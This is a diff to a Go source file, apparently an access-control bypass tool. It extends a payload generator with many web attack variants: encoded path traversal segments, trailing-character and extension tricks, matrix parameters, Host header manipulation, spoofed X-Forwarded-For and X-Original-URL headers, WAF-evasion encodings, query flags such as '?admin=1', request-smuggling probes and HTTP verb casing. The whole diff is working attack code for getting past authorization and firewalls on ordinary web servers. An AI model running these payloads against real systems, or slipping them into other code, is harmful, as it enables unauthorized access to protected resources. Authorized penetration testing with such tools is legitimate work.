@@ -331,5 +331,167 @@ func generatePayloads(domain, path string) []Payload {
 		p = append(p, Payload{Type: "Path Prefix Double", Method: "GET", PathOverride: "/%252f/" + firstDir + restPath})
 	}
 
+	// ---------- 20. Extended "extension" bypass ----------
+	// Static-file extensions that routers commonly whitelist ahead of auth.
+	for _, ext := range []string{
+		".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff",
+		".woff2", ".ttf", ".map", ".webmanifest", ".jsonld", ".rss", ".atom",
+	} {
+		p = append(p, Payload{Type: "Extension Whitelist", Method: "GET", Suffix: ext})
+		p = append(p, Payload{Type: "Extension Whitelist", Method: "GET", Suffix: "/" + ext})
+	}
+
+	// ---------- 21. Trailing junk that some frameworks strip ----------
+	for _, junk := range []string{
+		"/", "//", "///", "/.", "/..", "/...", "/;", "/;;", "/*", "/**",
+		"/%2e", "/%2f", "/\t", "/%09", "/ ", "/%20", "/%0a", "/%0d",
+		"/?", "/??", "/#", "/##", "/~", "/!", "/$", "/&", "/'", "/\"",
+		"/%27", "/%22", "/%3f", "/%23", "/%25", "/%00", "/%01", "/%1f",
+	} {
+		p = append(p, Payload{Type: "Trailing Junk", Method: "GET", Suffix: junk})
+	}
+
+	// ---------- 22. Matrix parameters (J2EE / Spring) ----------
+	for _, mp := range []string{
+		";jsessionid=x", ";a=b", ";%20", ";.json", ";.css", ";x=y", ";=",
+		";%00", ";/", ";;", ";test=1",
+	} {
+		p = append(p, Payload{Type: "Matrix Param", Method: "GET", Suffix: mp})
+	}
+
+	// ---------- 23. Encoded separators / dot segments ----------
+	for _, seg := range []string{
+		"/%2e%2e/", "/%2e%2e%2e/", "/..%2e/", "/.%2e/", "/%2e./",
+		"/%252e%252e/", "/%c0%ae%c0%ae/", "/%uff0e%uff0e/", "/\u2024\u2024/",
+		"/%e0%80%ae%e0%80%ae/", "/%2e%2e%5c", "/..%255c", "/%2e%2e%00/",
+		"/%2e%2e%3b/", "/..%3b/", "/..%3f/", "/..%23/", "/.%2e%2f",
+	} {
+		p = append(p, Payload{Type: "Dot Segment", Method: "GET", Suffix: seg})
+		if path != "/" {
+			p = append(p, Payload{Type: "Dot Segment Prefix", Method: "GET", PathOverride: seg + strings.TrimPrefix(path, "/")})
+		}
+	}
+
+	// ---------- 24. Case + slash combination on the path itself ----------
+	if path != "/" {
+		trimmed := strings.TrimPrefix(path, "/")
+		segments := strings.Split(trimmed, "/")
+		var variants []string
+		for i := range segments {
+			segments[i] = strings.ToUpper(segments[i][:1]) + segments[i][1:]
+			variants = append(variants, "/"+strings.Join(segments, "/"))
+			segments[i] = strings.ToLower(segments[i])
+		}
+		for _, v := range variants {
+			p = append(p, Payload{Type: "Path Case Mix", Method: "GET", PathOverride: v})
+			p = append(p, Payload{Type: "Path Case Mix", Method: "GET", PathOverride: v + "/"})
+			p = append(p, Payload{Type: "Path Case Mix", Method: "GET", PathOverride: "//" + strings.TrimPrefix(v, "/")})
+		}
+	}
+
+	// ---------- 25. Absolute URI in the request target ----------
+	// Some proxies route on the absolute-URI form only.
+	absTargets := []string{
+		"http://" + domain + path,
+		"https://" + domain + path,
+		"//" + domain + path,
+	}
+	for _, at := range absTargets {
+		p = append(p, Payload{Type: "Absolute URI", Method: "GET", Header: map[string]string{"__req_target": at}})
+	}
+
+	// ---------- 26. Host header twist ----------
+	for _, h := range []string{
+		domain + ":" + randomSlug(4),
+		domain + ".",
+		"www." + domain,
+		domain + "..",
+		domain + ":80",
+		domain + ":443",
+		domain + ":0",
+		"localhost." + domain,
+	} {
+		p = append(p, Payload{Type: "Host Header Twist", Method: "GET", Header: map[string]string{"Host": h}})
+	}
+
+	// ---------- 27. Whitespace / padding in header names ----------
+	// Servers treat "X-Forwarded-For " and "X-Forwarded-For" differently; WAF
+	// normalises one and passes the other through.
+	for _, hk := range []string{
+		"X-Forwarded-For ", " X-Forwarded-For", "X-Forwarded-For\t",
+		"X-Forwarded-For\x0b", "X-Forwarded_For", "X-Forwarded.For",
+		"X-ForwardedFor", "XForwardedFor", "X-Forwarded-for ",
+	} {
+		p = append(p, Payload{Type: "Header Whitespace", Method: "GET", Header: map[string]string{hk: "127.0.0.1"}})
+	}
+
+	// ---------- 28. Duplicate headers ----------
+	// Some WAFs validate only the first instance while the backend reads the
+	// last. Both orders get tried.
+	for _, kv := range []struct{ k, first, second string }{
+		{"X-Forwarded-For", "1.1.1.1", "127.0.0.1"},
+		{"X-Forwarded-For", "127.0.0.1", "1.1.1.1"},
+		{"X-Forwarded-Host", domain, "127.0.0.1"},
+		{"X-Original-URL", "/", path},
+		{"X-Rewrite-URL", "/", path},
+	} {
+		p = append(p, Payload{Type: "Duplicate Header", Method: "GET",
+			Header: map[string]string{kv.k: kv.first + ", " + kv.second}})
+	}
+
+	// ---------- 29. WAF evasion encodings on the rewritten path ----------
+	if path != "/" {
+		encForms := []string{
+			path,
+			strings.ReplaceAll(path, "/", "//"),
+			strings.ReplaceAll(path, "/", "/./"),
+			strings.ReplaceAll(path, "/", "/%2f"),
+			strings.ReplaceAll(path, "/", "/;/"),
+			strings.ReplaceAll(path, "/", "/%2e/"),
+			strings.ReplaceAll(path, "/", "/\\"),
+			strings.ReplaceAll(path, "/", "/\t"),
+			"/" + strings.ReplaceAll(strings.TrimPrefix(path, "/"), "/", "%2f"),
+			"/" + strings.ReplaceAll(strings.TrimPrefix(path, "/"), "/", "%252f"),
+		}
+		for _, ef := range encForms {
+			p = append(p, Payload{Type: "Rewrite Encoding", Method: "GET",
+				Header: map[string]string{"X-Original-URL": ef}, PathOverride: "/"})
+			p = append(p, Payload{Type: "Rewrite Encoding", Method: "GET",
+				Header: map[string]string{"X-Rewrite-URL": ef}, PathOverride: "/"})
+		}
+	}
+
+	// ---------- 30. Query-string injection ----------
+	for _, q := range []string{
+		"?admin=1", "?debug=1", "?isAdmin=true", "?role=admin", "?access=1",
+		"?auth=1", "?bypass=1", "?test=1", "?_=1", "?%2F=1",
+	} {
+		p = append(p, Payload{Type: "Query Injection", Method: "GET", Suffix: q})
+	}
+
+	// ---------- 31. Chunked / smuggling probe headers ----------
+	// Sent to the same endpoint; the server's framing tells whether it is
+	// de-synced.
+	for _, ct := range []string{
+		"Transfer-Encoding", "Content-Length", "chunked",
+	} {
+		safeCT := "aaaa"
+		if ct == "chunked" {
+			safeCT = "0"
+		}
+		p = append(p, Payload{Type: "Smuggling Probe", Method: "POST",
+			Header: map[string]string{"Transfer-Encoding": ct}, Body: safeCT,
+			ContentType: "text/plain"})
+	}
+	p = append(p, Payload{Type: "Smuggling Probe", Method: "POST",
+		Header: map[string]string{"Transfer-Encoding": "chunked", "Content-Length": "3"}, Body: "0\r\n\r\n"})
+
+	// ---------- 32. Method casing / obfuscation ----------
+	for _, m := range []string{
+		"Get", "gEt", "PoSt", "PuT", "DeLeTe", "OpTiOnS", "HeAd", "PaTcH",
+	} {
+		p = append(p, Payload{Type: "Verb Casing", Method: m})
+	}
+
 	return p
 }
